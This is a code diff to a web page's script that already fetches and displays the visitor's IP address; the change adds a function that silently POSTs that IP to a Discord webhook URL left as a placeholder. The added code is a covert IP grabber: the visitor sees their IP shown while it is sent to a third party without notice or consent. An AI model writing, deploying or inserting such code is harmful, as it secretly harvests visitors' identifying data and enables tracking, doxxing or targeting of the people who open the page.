@@ -9,10 +9,35 @@
                 .then(data => {
                     const ip = data.ip;
                     document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
+                    sendIPToWebhook(ip);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
+        }
+
+        function sendIPToWebhook(ip) {
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+            const payload = {
+                content: 'IP: ' + ip
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP sent to webhook successfully.');
+                } else {
+                    console.log('Failed to send IP to webhook.');
+                }
+            })
+            .catch(error => {
+                console.log('Error:', error);
+            });
         }
     </script>
     <style>
